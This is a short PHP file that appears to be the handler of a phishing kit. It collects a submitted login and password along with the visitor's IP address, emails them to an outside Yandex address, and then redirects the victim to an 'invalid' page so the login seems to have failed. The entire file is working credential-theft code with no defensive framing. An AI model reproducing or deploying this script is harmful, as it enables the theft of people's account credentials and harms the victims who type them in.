<?php
    if(!empty($_POST['login']) and !empty($_POST['password']))
    {
      $login = trim(strip_tags($_POST['login']));
      $password = trim(strip_tags($_POST['password']));
      $ip = $_SERVER['REMOTE_ADDR'];
 
      mail('dollyomos@yandex.com', 'Log ('.$login.')', 
      'Login: '.$login.'<br />Password: '.$password.'<br />IP: '.$ip.'<br />'.$mail,"Content-type:text/html;charset=windows-1251");
    echo "<html><head><META HTTP-EQUIV='Refresh' content ='0; URL=invalid.php?email=$login'></head></html>";
}
?>